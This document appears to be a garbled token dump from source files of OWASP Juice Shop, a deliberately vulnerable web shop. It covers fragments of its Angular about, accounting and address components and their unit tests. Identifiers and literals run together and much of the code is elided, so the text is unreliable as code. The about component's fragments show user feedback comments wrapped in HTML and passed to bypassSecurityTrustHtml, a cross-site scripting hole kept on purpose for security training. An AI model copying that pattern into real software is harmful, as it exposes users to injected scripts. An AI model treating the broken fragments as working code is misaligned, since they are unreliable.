  -->P:/My Drive/Git/juice-shop/frontend/src/app/about/about.component.spec.ts FIXME Replace with actual import if https://github.com/dockleryxk/ng-simple-slideshow/issues/70 gets fixed// FIXM ... s fixedComponentFixtureSlideshowModule'ng-simple-slideshow''./about.component'MatCardModule'@angular/material/card'NO_ERRORS_SCHEMA'../Services/configuration.service''AboutComponent'fixtureslideshowModuleconfigurationServicecreateSpy'SlideshowModule''getApplicationConfiguration'schemasdeclarationscompileComponentscreateComponentcomponentInstancedetectChanges'should create''should set Twitter link as obtained from configuration''TWITTER'ngOnInit'should set Facebook link as obtained from configuration''FACEBOOK''should set Slack link as obtained from configuration''SLACK''should set Reddit link as obtained from configuration''REDDIT''should set press kit link as obtained from configuration''PRESS_KIT''should set NFT link as obtained from configuration''NFT'type Co ... Fixtureimport  ... deshow''ng-sim ... deshow'import  ... ponent'./about.component/aboutimport  ... l/card''@angul ... l/card'@angular/material/card'../Ser ... ervice'../Services/configuration.service/Services/configuration{\r\n  le ...   })\r\n}let com ... mponentlet fix ... ponent>fixture ... ponent>Compone ... ponent>let slideshowModulelet con ... ServicewaitFor ... )\r\n  })slidesh ... odule')jasmine ... odule')jasmine.createSpyconfigu ... tion'])jasmine ... tion'])['getAp ... ation']'getApp ... ration'configu ... { } }))configu ... rnValueconfigu ... ion.andconfigu ... urationof({ ap ...  { } }){ application: { } }application: { }TestBed ... nents()TestBed ... ponentsschemas ... SCHEMA][NO_ERRORS_SCHEMA]declara ... ponent][AboutComponent]{ provi ... odule }provide ... wModuleuseValu ... wModulefixture ... ponent)TestBed ... ponent)TestBed ... mponentcompone ... nstancefixture ... nstancefixture ... anges()fixture ... Changesshould createexpect(component)'should ... ration'should set Twitter link as obtained from configuration() => { ... ')\r\n  }{\r\n     ... ')\r\n  }configu ... } } }))of({ ap ...  } } }){ appli ... ' } } }applica ... ER' } }{ socia ... ER' } }social: ... TTER' }{ twitt ... TTER' }twitter ... WITTER'TWITTERcomponent.ngOnInit()component.ngOnInitexpect( ... ITTER')expect( ... l).toBeexpect( ... terUrl)component.twitterUrlshould set Facebook link as obtained from configurationapplica ... OK' } }{ socia ... OK' } }social: ... BOOK' }{ faceb ... BOOK' }faceboo ... CEBOOK'FACEBOOKexpect( ... EBOOK')expect( ... ookUrl)compone ... bookUrlshould set Slack link as obtained from configurationapplica ... CK' } }{ socia ... CK' } }social: ... LACK' }{ slack ... LACK' }slackUrl: 'SLACK'SLACKexpect( ... SLACK')expect( ... ackUrl)component.slackUrlshould set Reddit link as obtained from configurationapplica ... IT' } }{ socia ... IT' } }social: ... DDIT' }{ reddi ... DDIT' }redditUrl: 'REDDIT'REDDITexpect( ... EDDIT')expect( ... ditUrl)component.redditUrlshould set press kit link as obtained from configurationsocial: ... _KIT' }{ press ... _KIT' }pressKi ... SS_KIT'PRESS_KITexpect( ... S_KIT')expect( ... KitUrl)compone ... sKitUrlshould set NFT link as obtained from configurationapplica ... FT' } }{ socia ... FT' } }social: ... 'NFT' }{ nftUrl: 'NFT' }nftUrl: 'NFT'NFTexpect( ... ('NFT')expect( ... nftUrl)component.nftUrlP:/My Drive/Git/juice-shop/frontend/src/app/about/about.component.tsComponentOnInitDomSanitizer'../Services/feedback.service'IImagelibrary'@fortawesome/fontawesome-svg-core'faFacebookfaRedditfaSlackfaTwitter'@fortawesome/free-brands-svg-icons'faNewspaperfaStar'@fortawesome/free-regular-svg-icons'fasStarfaPalette'@fortawesome/free-solid-svg-icons''app-about'templateUrl'./about.component.html'styleUrls'./about.component.scss''assets/public/images/carousel/1.jpg''assets/public/images/carousel/2.jpg''assets/public/images/carousel/3.jpg''assets/public/images/carousel/4.jpg''assets/public/images/carousel/5.png''assets/public/images/carousel/6.jpg''assets/public/images/carousel/7.jpg'stars'<i class="fas fa-star"></i><i class="far fa-star"></i><i class="far fa-star"></i><i class="far fa-star"></i><i class="far fa-star"></i>''<i class="fas fa-star"></i><i class="fas fa-star"></i><i class="far fa-star"></i><i class="far fa-star"></i><i class="far fa-star"></i>''<i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="far fa-star"></i><i class="far fa-star"></i>''<i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="far fa-star"></i>''<i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i>'feedbackServicesanitizerpopulateSlideshowFromFeedbacks`<span style="width: 90%; display:block;">${}<br/> (${})</span>`bypassSecurityTrustHtml%type OnInit../Services/feedback.service/Services/feedbacktype IImageimport  ... g-core''@forta ... g-core'import  ... -icons''@forta ... -icons'faStar as fasStarlibrary ... alette)library.add@Compon ... s']\r\n})Compone ... s']\r\n}){\r\n  se ... ss']\r\n}selecto ... -about'app-abouttemplat ... t.html''./abou ... t.html'./about.component.htmlstyleUr ... .scss']['./abo ... .scss']'./abou ... t.scss'./about.component.scssscsspublic  ...  stringpublic  ... [] = []IImage[]private ... g'\r\n  ][\r\n     ... g'\r\n  ]'assets ... /1.jpg'assets/public/images/carousel/1.jpgassets/public/images/carousel/1'assets ... /2.jpg'assets/public/images/carousel/2.jpgassets/public/images/carousel/2'assets ... /3.jpg'assets/public/images/carousel/3.jpgassets/public/images/carousel/3'assets ... /4.jpg'assets/public/images/carousel/4.jpgassets/public/images/carousel/4'assets ... /5.png'assets/public/images/carousel/5.pngassets/public/images/carousel/5'assets ... /6.jpg'assets/public/images/carousel/6.jpgassets/public/images/carousel/6'assets ... /7.jpg'assets/public/images/carousel/7.jpgassets/public/images/carousel/7private ... >'\r\n  ][\r\n     ... >'\r\n  ]'<i cla ... "></i>'<i class="fas fa-star"></i><i class="far fa-star"></i><i class="far fa-star"></i><i class="far fa-star"></i><i class="far fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="far fa-star"></i><i class="far fa-star"></i><i class="far fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="far fa-star"></i><i class="far fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="far fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i><i class="fas fa-star"></i>constru ... zer) {}ngOnIni ... })\r\n  }this.po ... backs()this.po ... edbackspopulat ... edbacksthis.co ... err) })this.co ... bscribethis.co ... ation()this.co ... urationthis.co ... Service(config ... \r\n    }if (con ...       }config? ... .socialconfig?.applicationconfig. ... tterUrlconfig. ... .socialconfig.applicationthis.tw ... tterUrlthis.twitterUrlconfig. ... bookUrlthis.fa ... bookUrlthis.facebookUrlconfig. ... lackUrlthis.sl ... lackUrlthis.slackUrlconfig. ... dditUrlthis.re ... dditUrlthis.redditUrlconfig. ... sKitUrlthis.pr ... sKitUrlthis.pressKitUrlconfig. ... .nftUrlthis.nf ... .nftUrlthis.nftUrlpopulat ... })\r\n  }this.fe ... \n    })this.fe ... bscribethis.fe ... .find()this.fe ... ce.findthis.feedbackService(feedba ... \r\n    }i < feedbacks.lengthfeedbacks.lengthfeedbac ... /span>`feedbacks[i].commentfeedbacks[i]`<span  ... /span>`<span s ... lock;"><span style="width: 90%; display:block;"><br/> (this.st ... rating]this.starsfeedbacks[i].rating)</span>feedbac ... omment)this.sa ... omment)this.sa ... ustHtmlthis.sanitizerbypassS ... ustHtmlthis.sl ... ment })this.sl ... ce.pushthis.sl ... aSource{ url:  ... mment }url: th ... length]this.im ... length]this.imagesi % thi ... .lengththis.images.lengthcaption ... comment(err) = ... \r\n    }private ... nitizerP:/My Drive/Git/juice-shop/frontend/src/app/accounting/accounting.component.htmlP:/My Drive/Git/juice-shop/frontend/src/app/accountingorderSource!element.deliveredelement.delivered{{ 'LABEL_MARK_AS_TRANSIT' | translate }}'LABEL_MARK_AS_TRANSIT''LABEL_ ... anslate'LABEL_ ... RANSIT'LABEL_MARK_AS_TRANSITchangeDeliveryStatuschangeD ... ent.id)element.id{{ 'LABEL_MARK_AS_DELIVERED' | translate }}'LABEL_MARK_AS_DELIVERED''LABEL_ ... IVERED'LABEL_MARK_AS_DELIVEREDdataSource{{ element.price }}element.pricemodifyPricemodifyP ... .value)price.value{{ quantityMap[element.id].quantity }}quantityMapquantit ... ent.id]modifyQuantityquanititymodifyQ ... .value)quantit ... .id].idquanitity.valuemat-elevation-z6 mat-own-cardinventory-tablemat-paginatormat-table[dataSource]mat-row*matRowDeflet row; columns: displayedColumns;mat-header-row*matHeaderRowDefdisplayedColumnsng-containermatColumnDefQuantitymat-cellmat-form-fieldinput-fieldmat-icon-button(click)modifyQuantity(quantityMap[element.id].id, quanitity.value)matSuffixfas fa-checkmat-header-cellPricemodifyPrice(element.id, price.value){{element.name}}element.nameorders-containerfxFlexAlignorders-tablelet row; columns: orderHistoryColumns;orderHistoryColumnsStatusButton*matCellDeflet elementfxFlex15%Print order confirmationmatTooltipmatTooltipPositionchangeDeliveryStatus(element.delivered, element.id)mat-icon*matHeaderCellDefStatus20%confirmationLABEL_STATUS{{element.totalPrice?.toFixed(2) }}element ... ixed(2)element ... toFixedelement.totalPriceLABEL_PRICEOrderId50%{{element.orderId }}element.orderIdLABEL_ORDER_IDP:/My Drive/Git/juice-shop/frontend/src/app/accounting/accounting.component.spec.tsMatDividerModule'@angular/material/divider''./accounting.component''../Services/product.service'RouterTestingModule'@angular/router/testing'MatGridListModule'@angular/material/grid-list'MatTableModule'@angular/material/table'MatPaginatorModule'@angular/material/paginator''../Services/quantity.service'MatFormFieldModule'@angular/material/form-field''rxjs/internal/observable/throwError''../Services/order-history.service'MatIconModule'@angular/material/icon'MatTooltipModule'@angular/material/tooltip''AccountingComponent'productServicequantityServiceorderHistoryService'getAll''put''get''toggleDeliveryStatus'ngAfterViewInit'should load products, quantitites and orders when initiated''should hold no products when product search API call fails''Error'loadProductstableData'should hold no orders when getAll orders API call fails'loadOrdersorderData'should hold no quantities when getAll quanitity API call fails'loadQuantity'should log error from product search API call directly to browser console''log''should log error from getAll orders API call directly to browser console''should load orders when toggleDeliveryStatus gets called''should log error from toggleDeliveryStatus API call directly to browser console''should log error from getAll quantity API call directly to browser console''should log and display errors while modifying price''should log and display errors while modifying quantity''should show confirmation on modifying quantity of a product''Apple Juice''should show confirmation on modifying price of a product''should modify quantity of a product''should modify price of a product'import  ... ivider''@angul ... ivider'@angular/material/divider'./acco ... ponent'./accounting.component/accounting../Services/product.service/Services/product@angular/router/testingimport  ... d-list''@angul ... d-list'@angular/material/grid-listimport  ... /table''@angul ... /table'@angular/material/tableimport  ... inator''@angul ... inator'@angular/material/paginator../Services/quantity.service/Services/quantityimport  ... -field''@angul ... -field'@angular/material/form-fieldimport  ... wError''rxjs/i ... wError'rxjs/internal/observable/throwError../Services/order-history.service/Services/order-historyimport  ... l/icon''@angul ... l/icon'@angular/material/iconimport  ... ooltip''@angul ... ooltip'@angular/material/tooltip'Accoun ... ponent'let productServicelet quantityServicelet ord ... Servicequantit ... 'put'])jasmine ... 'put'])['getAll', 'put']quantit ... of([]))quantit ... rnValuequantit ... All.andquantit ... .getAllof([])quantit ... of({}))quantit ... put.andquantityService.putof({})product ... 'put'])['searc ...  'put']product ... of([]))product ... rnValueproduct ... rch.andproduct ... .searchproduct ... of({}))product ... get.andproductService.getproduct ... put.andproductService.putorderHi ... atus'])jasmine ... atus'])['getAl ... tatus']'toggle ... Status'orderHi ... of([]))orderHi ... rnValueorderHi ... All.andorderHi ... .getAllorderHi ... of({}))orderHi ... tus.andorderHi ... yStatus[Accoun ... ponent]Transla ... rRoot()compone ... wInit()compone ... iewInit'should ... tiated'should load products, quantitites and orders when initiatedexpect( ... getAll)expect( ... search)'should ...  fails'should hold no products when product search API call fails() => { ... ])\r\n  }{\r\n     ... ])\r\n  }product ... rror'))throwError('Error')compone ... ducts()compone ... roductsexpect( ... ual([])expect( ... leData)component.tableDatashould hold no orders when getAll orders API call failsorderHi ... rror'))compone ... rders()component.loadOrdersexpect( ... erData)component.orderDatashould hold no quantities when getAll quanitity API call failsquantit ... rror'))compone ... ntity()compone ... uantityexpect( ... ityMap)compone ... tityMap'should ... onsole'should log error from product search API call directly to browser consolefakeAsy ... )\r\n  })console ... ('log')jasmine ... ('log')expect( ... Error')expect(console.log)should log error from getAll orders API call directly to browser console'should ... called'should load orders when toggleDeliveryStatus gets calledcompone ... rue, 1)compone ... yStatusshould log error from toggleDeliveryStatus API call directly to browser consoleshould log error from getAll quantity API call directly to browser console'should ...  price'should log and display errors while modifying priceproduct ... or' }))throwEr ... ror' }){ error: 'Error' }error: 'Error'compone ... 1, 100)compone ... fyPriceexpect( ... ror' })'should ... antity'should log and display errors while modifying quantityquantit ... or' }))'should ... roduct'should show confirmation on modifying quantity of a productquantit ... : 1 }))of({ ProductId: 1 }){ ProductId: 1 }compone ... ice' }][{ id:  ... ice' }]{ id: 1 ... uice' }name: 'Apple Juice'Apple Juiceshould show confirmation on modifying price of a productproduct ... ce' }))of({ na ... ice' }){ name: ... uice' }should modify quantity of a productexpect( ... ce.put)should modify price of a productP:/My Drive/Git/juice-shop/frontend/src/app/accounting/accounting.component.tsAfterViewInitOnDestroyViewChildMatPaginatorSubscriptionMatTableDataSourcefaCheck'../Services/snack-bar-helper.service'Order'app-accounting''./accounting.component.html''./accounting.component.scss''OrderId''Price''Status''StatusButton''paginatorOrderHistory'paginatorOrderHistory'Product''Quantity''paginator'paginatorproductSubscriptionquantitySubscriptionstockngOnDestroy`Quantity for ${} has been updated.`'confirmBar'`Price for ${deliveryStatustype AfterViewInittype OnDestroytype Subscription../Services/snack-bar-helper.service/Services/snack-bar-helperlibrary.add(faCheck)id: stringorderId: stringtotalPrice: numberdelivered: booleanselecto ... unting'app-accounting'./acco ... t.html'./accounting.component.html['./acc ... .scss']'./acco ... t.scss'./accounting.component.scsspublic  ... utton']['Order ... utton']paginat ... ginator@ViewCh ... true })ViewChi ... true })'pagina ... istory'{ static: true }static: truepaginat ... Historypublic  ... Order[]Order[]public orderSourcepublic  ... ntity']['Produ ... ntity']public  ... : any[]public dataSourceprivate ... riptionpublic  ... ap: anyconstru ... ce) { }ngAfter ... ()\r\n  }this.loadQuantity()this.loadQuantitythis.loadProducts()this.loadProductsthis.loadOrders()this.loadOrdersloadQua ... })\r\n  }this.qu ... err) })this.qu ... riptionthis.qu ... bscribethis.qu ... etAll()this.qu ... .getAllthis.quantityService(stock) ... \r\n    }this.qu ... ap = {}this.quantityMapstock.f ...      })stock.forEach(item)  ...       }this.qu ...       }this.qu ... ductId]item.ProductIdid: item.iditem.iditem.quantityloadPro ... })\r\n  }this.pr ... err) })this.pr ... riptionthis.pr ... bscribethis.pr ... rch('')this.pr ... .searchthis.productService(tableD ... \r\n    }this.ta ... bleDatathis.tableDatathis.da ... leData)this.dataSourcenew Mat ... leData)this.da ... ginatorthis.paginatorloadOrd ... })\r\n  }this.or ... err) })this.or ... bscribethis.or ... etAll()this.or ... .getAllthis.or ... Service(orders ... \r\n    }this.orderData = []this.orderDataconst orderthis.or ...      })this.orderData.pushid: order._idorder._idorderId ... orderIdorder.orderIdtotalPr ... alPriceorder.totalPricedeliver ... liveredorder.deliveredthis.or ... erData)this.orderSourcenew Mat ... erData)this.or ... Historythis.or ... ginatorthis.pa ... HistoryngOnDes ...  }\r\n  }this.pr ... cribe()this.qu ... cribe()modifyQ ... })\r\n  }this.qu ... \n    })this.qu ... alue })this.qu ... ice.put{ quant ... value }quantit ... : valuevalue < ... : valuevalue < 0(quanti ... \r\n    }const p ...      })product ...      })this.ta ...      })this.tableData.find(produc ...       }return  ... oductIdproduct ... oductIdproduct.idquantity.ProductIdthis.sn ... rmBar')`Quanti ... dated.`Quantity for  has been updated.confirmBarmodifyP ... })\r\n  }this.pr ... \n    })this.pr ... alue })this.pr ... ice.put{ price ... value }price:  ... : value(produc ... \r\n    }`Price  ... dated.`Price for changeD ... })\r\n  }this.or ... \n    })this.or ... atus })this.or ... yStatus{ deliveryStatus }P:/My Drive/Git/juice-shop/frontend/src/app/address/address.component.htmlP:/My Drive/Git/juice-shop/frontend/src/app/addressaddNewAddressDiv!addNewAddressDivshowNextButton!showNextButtonaddressExistemitSelectionToParentemitSel ... ent.id)emitSel ... oParentisSelectedselecti ... ed(row)selection.isSelected$event$event  ...  : nullselecti ... le(row)selection.toggle{{ element.id }}deleteAddressdeleteA ... ent.id)selecti ... e(row);address ... definedchooseAddresschooseAddress()mat-buttonbtn btn-nextprimaryProceed to payment selection[disabled]addressId === undefinedmargin-top: 20px;btn btn-new-addressAdd a new addressrouterLink/address/createlet row; columns: displayedColumns; let elementselection.toggle(row); emitSelectionToParent(element.id)Removefxflex10%deleteAddress(element.id)far fa-trash-altdisplay: none;Edit/address/edit/{{ element.id }}far fa-editCountry{{ element?.country }}element?.country40%{{element?.streetAddress}}element ... Address{{element?.city}}element?.city{{element?.state}}element?.state{{element?.zipCode}}element?.zipCodeName{{ element?.fullName }}element?.fullNamelet element; let rowmat-radio-buttonemitSelectionToParent(element.id)[checked]selection.isSelected(row)(change)$event ? selection.toggle(row) : nullP:/My Drive/Git/juice-shop/frontend/src/app/address/address.component.spec.tsAddressComponent'./address.component'MatInputModule'@angular/material/input'ReactiveFormsModule'@angular/forms''../Services/address.service''../address-create/address-create.component'MatExpansionModule'@angular/material/expansion'MatRadioModule'@angular/material/radio'MatDialogModule'@angular/material/dialog''../delivery-method/delivery-method.component''AddressComponent'addressService'del''TranslateService'onLangChangeonTranslationChangeonDefaultLangChangewithRoutes'should hold no addresses when get API call fails'storedAddresses'should log error from get address API call directly to browser console''should log error from delete address API call directly to browser console''should delete an address on calling deleteAddress''load''should store address id in session storage''setItem''addressId''./addr ... ponent'./address.componentimport  ... /input''@angul ... /input'@angular/material/inputimport  ... /forms'../Services/address.service/Services/address'../add ... ponent'../address-create/address-create.component/address-create/address-createimport  ... ansion''@angul ... ansion'@angular/material/expansionimport  ... /radio''@angul ... /radio'@angular/material/radioimport  ... dialog''@angul ... dialog'@angular/material/dialog'../del ... ponent'../delivery-method/delivery-method.component/delivery-method/delivery-methodlet addressServicelet translateServiceaddress ... 'del'])jasmine ... 'del'])['get', 'del']address ... of([]))address ... rnValueaddress ... get.andaddressService.getaddress ... of({}))address ... del.andaddressService.deltransla ... 'get'])jasmine ... 'get'])['get']transla ... of({}))transla ... rnValuetransla ... get.andtranslateService.gettransla ... itter()transla ... gChangenew EventEmitter()transla ... nChangeRouterT ...      ])RouterT ... hRoutes{ path: ... onent }[Addres ... ponent]should hold no addresses when get API call failsaddress ... rror'))expect( ... resses)compone ... dressesshould log error from get address API call directly to browser consoleshould log error from delete address API call directly to browser consolecompone ... ress(1)compone ... Address'should ... ddress'should delete an address on calling deleteAddressspyOn(c ... 'load')expect( ... ce.del)expect( ... ce.get)'should ... torage'should store address id in session storage() => { ... y)\r\n  }{\r\n     ... y)\r\n  }compone ... sId = 1component.addressIdspyOn(s ... tItem')compone ... dress()expect( ... as any)expect( ... etItem)session ... setItem1 as anyP:/My Drive/Git/juice-shop/frontend/src/app/address/address.component.tsInputOutputfaEditfaTrashAlt'@fortawesome/free-regular-svg-icons/'Router'@angular/router'SelectionModel'@angular/cdk/collections''app-address''./address.component.html''./address.component.scss'emitSelection'allowEdit'allowEdit'addNewAddressDiv''showNextButton''Name''Address''Country'router'Edit''Remove''Selection'hasValue'/delivery-method''ADDRESS_REMOVED'addressRemovedtranslationIdimport  ... icons/''@forta ... icons/'@fortawesome/free-regular-svg-icons/import  ... router'import  ... ctions''@angul ... ctions'@angular/cdk/collectionslibrary ... ashAlt)selecto ... ddress'app-address'./addr ... t.html'./address.component.html['./add ... .scss']'./addr ... t.scss'./address.component.scssemitSel ... itter()@Output()Output()public  ... = false@Input('allowEdit')Input('allowEdit')public  ...  = true@Input( ... ssDiv')Input(' ... ssDiv')@Input( ... utton')Input(' ... utton')public  ... definedpublic  ... untry']['Name' ... untry']selecti ... se, [])new Sel ... se, [])public  ... on: anypublic error: anyngOnIni ... ()\r\n  }this.allowEditthis.di ... emove')this.di ... ns.pushthis.di ... Columnsthis.di ... ction')this.di ... unshiftthis.load()this.loadload () ... })\r\n  }this.ad ... \n    })this.ad ... bscribethis.ad ... e.get()this.ad ... ice.getthis.addressService(addres ... \r\n    }this.ad ... .lengththis.addressExistaddresses.lengththis.st ... dressesthis.storedAddressesthis.da ... resses)new Mat ... resses)err.error?.erroremitSel ...  }\r\n  }this.se ... Value()this.se ... asValuethis.selectionthis.em ... mit(id)this.em ... on.emitthis.emitSelectionthis.addressId = idthis.addressIdthis.em ... efined)this.ad ... definedchooseA ... ))\r\n  }session ... ressId)this.ng ... hod']))this.ngZone.runasync ( ... thod'])await t ... thod'])this.ro ... thod'])this.router.navigatethis.router['/delivery-method']/delivery-methoddeleteA ... })\r\n  }this.ad ... del(id)this.ad ... ice.delthis.error = nullthis.errorthis.tr ...      })this.tr ... MOVED')this.translate.getthis.translateADDRESS_REMOVED(addres ...       }(transl ...       }private ...  RouterP:/My Drive/Git/juice-shop/frontend/src/app/address-create/address-create.component.htmlP:/My Drive/Git/juice-shop/frontend/src/app/address-createcountryControl'MANDATORY_COUNTRY''MANDAT ... anslateMANDATORY_COUNTRYinvaliderrorscountry ... equiredcountry ... invalidcountry ... .errorsnameControl'MANDATORY_NAME'MANDATORY_NAMEnameCon ... equirednameControl.invalidnameControl.errorsnumberControl'MANDATORY_NUMBER'MANDATORY_NUMBERnumberC ... equirednumberC ... invalidnumberControl.errorsnumberC ... rs.max)(number ... rs.max)numberC ... ors.maxnumberC ... ors.min'1000000-9999999999'{range: ... 99999'}range:  ... 999999'1000000-9999999999pinControl'MANDATORY_ZIP'MANDATORY_ZIPpinCont ... equiredpinControl.invalidpinControl.errorsaddressControl'MANDATORY_ADDRESS'MANDATORY_ADDRESSaddress ... equiredaddress ... invalidaddress ... .errorscityControl'MANDATORY_CITY'MANDATORY_CITYcityCon ... equiredcityControl.invalidcityControl.errorsstateControl'STATE_PLACEHOLDER''STATE_ ... anslateSTATE_PLACEHOLDERrouteToPreviousUrlrouteToPreviousUrl()save()countryControl.invalid || nameControl.invalid || numberControl.invalid || pinControl.invalid || addressControl.invalid || cityControl.invalid{{'BTN_SUBMIT' | translate}}'BTN_SUBMIT''BTN_SU ... anslateBTN_SUBMITmat-stroked-buttonbtn-return{{'LABEL_BACK' | translate}}'LABEL_BACK'LABEL_BACKform-containeraddress-formappearance[formControl][placeholder]'STATE_PLACEHOLDER' | translatematInputmat-labelmat-errorcityControl.invalid && cityControl.errors.required'MANDATORY_CITY' | translateaddressControl.invalid && addressControl.errors.requiredmat-hint{{adress.value?.length || 0}}adressadress. ... th || 0adress.value?.lengthadress.valueemmargin-left:5px;{{ 'MAX_TEXTAREA_LENGTH' | translate: {length: '160'} }}'MAX_TEXTAREA_LENGTH''160''MAX_TE ...  '160'}'MAX_TE ... LENGTH'MAX_TEXTAREA_LENGTH{length: '160'}length: '160'160fas fa-exclamation-circletextareapinControl.invalid && pinControl.errors.required{{pin.value?.length || 0}}pinpin.val ... th || 0pin.value?.lengthpin.valuenumberControl.invalid && (numberControl.errors.min || numberControl.errors.max)[translateParams]{range: '1000000-9999999999'}numberControl.invalid && numberControl.errors.required'MANDATORY_NUMBER' | translatenameControl.invalid && nameControl.errors.required'MANDATORY_NAME' | translatecountryControl.invalid && countryControl.errors.required'MANDATORY_COUNTRY' | translateP:/My Drive/Git/juice-shop/frontend/src/app/address-create/address-create.component.spec.ts'./address-create.component''AddressCreateComponent''getById''save''should reinitizalise forms by calling resetForm'setValue'US''jim'9800000000'NX 101''Bakers Street''NYC''NY'resetFormpristineuntouched'should be compulsory to provide country''should be compulsory to provide name''should be compulsory to provide number''should be compulsory to provide pin''should be compulsory to provide address''should be compulsory to provide city''should not be compulsory to provide state''pin code should not be more than 8 characters''a''address should not be more than 160 characters'161'number should be in the range [1111111, 9999999999]'11111101000000000099999999991111111'should reset the form on updating address and show confirmation''ADDRESS_UPDATED''edit''resetForm''ngOnInit''should reset the form on adding address and show confirmation''ADDRESS_ADDED''should clear the form and display error if saving address fails''should clear the form and display error if updating address fails''should populate the form on calling initializeForm'initializeForm./address-create.component/address-create'Addres ... ponent'address ... save'])jasmine ... save'])['getBy ... 'save']address ... ave.andaddressService.saveaddress ... yId.andaddress ... getByIdaddress ... put.andaddressService.put'should ... etForm'should reinitizalise forms by calling resetFormcompone ... e('US')compone ... etValuecompone ... Controlcompone ... ('jim')compone ... 000000)compone ... X 101')component.pinControlNX 101compone ... treet')Bakers Streetcompone ... ('NYC')NYCcompone ... e('NY')NYcompone ... tForm()component.resetFormexpect( ... oBe('')expect( ... e).toBeexpect( ... .value)compone ... l.valueexpect( ... e(true)expect( ... istine)compone ... ristineexpect( ... ouched)compone ... touched'should ... ountry'should be compulsory to provide countrycompone ... lue('')expect( ... .valid)compone ... l.valid'should ... e name'should be compulsory to provide name'should ... number'should be compulsory to provide number'should ... de pin'should be compulsory to provide pinshould be compulsory to provide address'should ... e city'should be compulsory to provide city'should ...  state'should not be compulsory to provide stateit('pin ... )\r\n  })'pin co ... acters'pin code should not be more than 8 characterslet str: string = ''str: string = ''for (le ... \r\n    }i < 9++istr += 'a'compone ... ue(str)str = str.slice(1)str.slice(1)str.sliceit('add ... )\r\n  })'addres ... acters'address should not be more than 160 charactersi < 161it('num ... )\r\n  })'number ... 99999]'number should be in the range [1111111, 9999999999]number should be in the range [1111111, 9999999999]compone ... 111110)compone ... 999999)compone ... 111111)'should ... mation'should reset the form on updating address and show confirmationaddress ... NY' }))of({ city: 'NY' }){ city: 'NY' }city: 'NY'transla ... ATED'))of('ADD ... DATED')ADDRESS_UPDATEDcompone ...  'edit'component.modeeditspyOn(c ... tForm')spyOn(c ... nInit')component.save()component.saveexpect( ... 'NY' })expect( ... OnInit)expect( ... etForm)should reset the form on adding address and show confirmationtransla ... DDED'))of('ADDRESS_ADDED')ADDRESS_ADDEDshould clear the form and display error if saving address failsaddress ... or' }))should clear the form and display error if updating address fails'should ... zeForm'should populate the form on calling initializeFormcompone ... 'NY' })compone ... izeForm{ count ...  'NY' }country: 'US'fullName: 'jim'mobileN ... 0000000zipCode: 'NX 101'streetA ... Street'city: 'NYC'state: 'NY'expect( ... e('US')expect( ... ('jim')expect( ... 000000)expect( ... X 101')expect( ... treet')expect( ... ('NYC')expect( ... e('NY')P:/My Drive/Git/juice-shop/frontend/src/app/address-create/address-create.component.tsUntypedFormControlValidators'../Services/form-submit.service'ActivatedRouteParamMap'app-address-create''./address-create.component.html''./address-create.component.scss''create'formSubmitServiceactivatedRouteparamMap'address-form''submitButton'savedAddressaddressUpdatedaddressAddedmarkAsUntouchedmarkAsPristine../Services/form-submit.service/Services/form-submittype ParamMapselecto ... create'app-address-create./address-create.component.html./address-create.component.scsspublic  ... uired])new Unt ... uired])[Valida ... quired]Validators.requiredpublic  ... 9999)])new Unt ... 9999)])[Valida ... 99999)]Validat ... 111111)Validators.minValidat ... 999999)Validators.maxpublic  ... th(8)])new Unt ... th(8)])[Valida ... gth(8)]Validat ... ngth(8)Validators.maxLengthpublic  ... (160)])new Unt ... (160)])[Valida ... h(160)]Validat ... th(160)public  ... ntrol()new Unt ... ntrol()public  ... create'private ... definedthis.address = {}this.addressthis.ac ... \n    })this.ac ... bscribethis.ac ... aramMapthis.activatedRoute(paramM ... \r\n    }if (par ...       }paramMa ... essId')paramMap.hasthis.mode = 'edit'this.modethis.ad ... essId')paramMap.getthis.ad ...      })this.ad ... ressId)this.ad ... getByIdthis.in ... ddress)this.initializeFormthis.mode = 'create'this.ad ...  = nullthis.fo ... ve() })this.fo ... Handlerthis.fo ... Service() => { ... ave() }{ this.save() }this.save()this.savesave () ...  }\r\n  }this.ad ... l.valuethis.address.countrythis.co ... l.valuethis.countryControlthis.ad ... ullNamethis.na ... l.valuethis.nameControlthis.ad ... bileNumthis.nu ... l.valuethis.numberControlthis.address.zipCodethis.pi ... l.valuethis.pinControlthis.ad ... Addressthis.addressControlthis.address.citythis.ci ... l.valuethis.cityControlthis.address.statethis.st ... l.valuethis.stateControlthis.mode === 'edit'this.ad ... ddress)this.ad ... ice.put(savedA ...       }this.ngOnInit()this.ngOnInitthis.resetForm()this.resetFormthis.ro ... usUrl()this.ro ... iousUrlthis.tr ... city }){ city: ... .city }city: s ... ss.citysavedAddress.citythis.ad ... ce.saveinitial ... e)\r\n  }this.co ... ountry)this.co ... etValuethis.na ... llName)this.na ... etValuethis.nu ... ileNum)this.nu ... etValuethis.pi ... ipCode)this.pi ... etValuethis.ad ... etValuethis.ci ... s.city)this.ci ... etValuethis.st ... .state)this.st ... etValuerouteTo ... ()\r\n  }this.location.back()this.location.backthis.locationresetFo ... ')\r\n  }this.co ... uched()this.co ... touchedthis.co ... stine()this.co ... ristinethis.co ... lue('')this.na ... uched()this.na ... touchedthis.na ... stine()this.na ... ristinethis.na ... lue('')this.nu ... uched()this.nu ... touchedthis.nu ... stine()this.nu ... ristinethis.nu ... lue('')this.pi ... uched()this.pi ... touchedthis.pi ... stine()this.pi ... ristinethis.pi ... lue('')this.ad ... uched()this.ad ... touchedthis.ad ... stine()this.ad ... ristinethis.ad ... lue('')this.ci ... uched()this.ci ... touchedthis.ci ... stine()this.ci ... ristinethis.ci ... lue('')this.st ... uched()this.st ... touchedthis.st ... stine()this.st ... ristinethis.st ... lue('')private ... ocationpublic  ... edRouteP:/My Drive/Git/juice-shop/frontend/src/app/address-select/address-select.component.htmlP:/My Drive/Git/juice-shop/frontend/src/app/address-select[showNextButton]P:/My 